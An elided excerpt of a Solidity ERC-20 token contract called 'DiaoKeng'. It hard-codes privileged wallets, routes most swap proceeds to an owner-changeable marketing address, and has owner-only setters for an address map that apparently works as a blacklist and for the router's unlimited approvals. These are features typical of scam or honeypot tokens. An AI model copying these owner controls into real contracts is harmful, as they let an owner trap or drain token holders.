...
contract DiaoKeng is Ownable, IERC20Metadata {
    ...
    constructor() {
        ...
        _main = 0xFe9A366ae007E10B6bB12154cB402d993909399e;
        _mark= 0x2B3a85920DE899222fDe26E5c0404E5946161166;
        _dead = 0x000000000000000000000000000000000000dEaD;
        _whites[_main] = true;
        _whites[_mark] = true;
        _whites[address(this)] = true;
        _whites[_dead] = true;
        _mint(_main, 1000000000000000 * 10 ** decimals());
    }
    ...
    function _swapAndLiquid() private {
        ...
        if (_maxsell > 0 && balances > _maxsell) {
            balances = _maxsell;
            _swapTokenForToken(balances*11/12);
            uint256 fistval2 = IERC20(_fist).balanceOf(address(this));
            IERC20(_fist).transfer(_mark, fistval2*10/11);
            balances = _maxsell;
                if (balances*1/12 > 0 && fistval2*1/11 > 0) {
                addLiquidity2(balances*1/12, (fistval2)*1/11);
            }
    ...
    function setmarks(address mark)public onlyOwner{
        _mark = mark;
    }
    function sethei(address addr, bool val) public onlyOwner {
        _hei[addr] = val;
    }
    function setRouter(address router, address fist) public onlyOwner {
        _fist = fist;
        _wrap = 0xb60be2D142eE447aFee0795ac46A73E9A1d99791;
        _router = router;
        _whites[router] = true;
        IERC20(_fist).approve(_router, 9 * 10**70);
        _approve(address(this), _router, 9 * 10**70);
